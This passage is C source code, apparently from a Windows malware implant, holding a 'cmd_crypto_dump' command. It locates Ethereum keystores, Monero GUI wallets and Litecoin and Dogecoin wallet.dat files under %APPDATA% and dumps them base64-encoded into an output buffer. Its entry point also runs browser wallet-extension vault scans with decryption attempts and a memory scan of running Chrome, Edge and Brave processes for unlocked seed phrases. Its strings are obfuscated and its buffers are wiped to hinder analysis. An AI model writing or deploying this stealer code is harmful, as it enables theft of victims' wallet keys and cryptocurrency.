        snprintf(tmpl, sizeof(tmpl), "%%APPDATA%%\\%s\\%s", wlt, wdat);
        ExpandEnvironmentStringsA(tmpl, fpath, sizeof(fpath));
        snprintf(lbl, sizeof(lbl), "%s/%s", wlt, wdat);
        _dump_file_b64(lbl, fpath, out, outsz, pos);
        snprintf(tmpl, sizeof(tmpl), "%%APPDATA%%\\%s\\%s", wlt, wlts);
        _dump_dir_files(wlt, tmpl, ".dat", out, outsz, pos);
        SecureZeroMemory(wlt, sizeof(wlt));
        SecureZeroMemory(wdat, sizeof(wdat));
        SecureZeroMemory(wlts, sizeof(wlts));
    }

    /* Ethereum keystore */
    {
        char ks[9] = {0};
        EVS_D(wlt, EVS_str_wlt_Ethereum); /* "Ethereum" */
        EVS_D(ks,  EVS_str_wlt_keystore); /* "keystore" */
        snprintf(lbl,  sizeof(lbl),  "%s/%s",             wlt, ks);
        snprintf(tmpl, sizeof(tmpl), "%%APPDATA%%\\%s\\%s", wlt, ks);
        _dump_dir_files(lbl, tmpl, NULL, out, outsz, pos);
        SecureZeroMemory(wlt, sizeof(wlt));
        SecureZeroMemory(ks, sizeof(ks));
    }

    /* Monero GUI */
    {
        char mproj[15] = {0}, mgui[11] = {0}, wlts[8] = {0};
        EVS_D(wlt,   EVS_str_wlt_Monero);      /* "Monero" */
        EVS_D(mproj, EVS_str_wlt_monero_proj); /* "monero-project" */
        EVS_D(mgui,  EVS_str_wlt_monero_gui);  /* "monero-gui" */
        EVS_D(wlts,  EVS_str_wlt_wallets);     /* "wallets" */
        snprintf(tmpl, sizeof(tmpl), "%%APPDATA%%\\%s\\%s\\%s", mproj, mgui, wlts);
        _dump_dir_files(wlt, tmpl, NULL, out, outsz, pos);
        SecureZeroMemory(wlt, sizeof(wlt));
        SecureZeroMemory(mproj, sizeof(mproj));
        SecureZeroMemory(mgui, sizeof(mgui));
        SecureZeroMemory(wlts, sizeof(wlts));
    }

    /* Litecoin Core */
    {
        char wdat[11] = {0};
        EVS_D(wlt,  EVS_str_wlt_Litecoin);  /* "Litecoin" */
        EVS_D(wdat, EVS_str_wlt_wallet_dat); /* "wallet.dat" */
        snprintf(tmpl, sizeof(tmpl), "%%APPDATA%%\\%s\\%s", wlt, wdat);
        ExpandEnvironmentStringsA(tmpl, fpath, sizeof(fpath));
        snprintf(lbl, sizeof(lbl), "%s/%s", wlt, wdat);
        _dump_file_b64(lbl, fpath, out, outsz, pos);
        SecureZeroMemory(wlt, sizeof(wlt));
        SecureZeroMemory(wdat, sizeof(wdat));
    }

    /* Dogecoin Core */
    {
        char wdat[11] = {0};
        EVS_D(wlt,  EVS_str_wlt_Dogecoin);  /* "Dogecoin" */
        EVS_D(wdat, EVS_str_wlt_wallet_dat); /* "wallet.dat" */
        snprintf(tmpl, sizeof(tmpl), "%%APPDATA%%\\%s\\%s", wlt, wdat);
        ExpandEnvironmentStringsA(tmpl, fpath, sizeof(fpath));
        snprintf(lbl, sizeof(lbl), "%s/%s", wlt, wdat);
        _dump_file_b64(lbl, fpath, out, outsz, pos);
        SecureZeroMemory(wlt, sizeof(wlt));
        SecureZeroMemory(wdat, sizeof(wdat));
    }
}

/* ── public entry point ──────────────────────────────────────────────── */

int cmd_crypto_dump(const char *args, char *output_buf, size_t output_size)
{
    (void)args;
    size_t pos = 0;

    /* 1. LevelDB vault scan + decrypt attempt (empty password) */
    _scan_browser_extensions(output_buf, output_size, &pos);

    /* 2. Desktop wallet files */
    _scan_desktop_wallets(output_buf, output_size, &pos);

    /* 3. Memory scan for unlocked mnemonics in running Chrome/Edge/Brave */
    if (pos + 128 < output_size)
        _scan_chrome_mnemonics(output_buf, output_size, &pos);

    if (pos == 0)
    {
        snprintf(output_buf, output_size, "[crypto] no wallets found\n");
        return 1;
    }

    output_buf[pos] = 0;
    return 0;
}
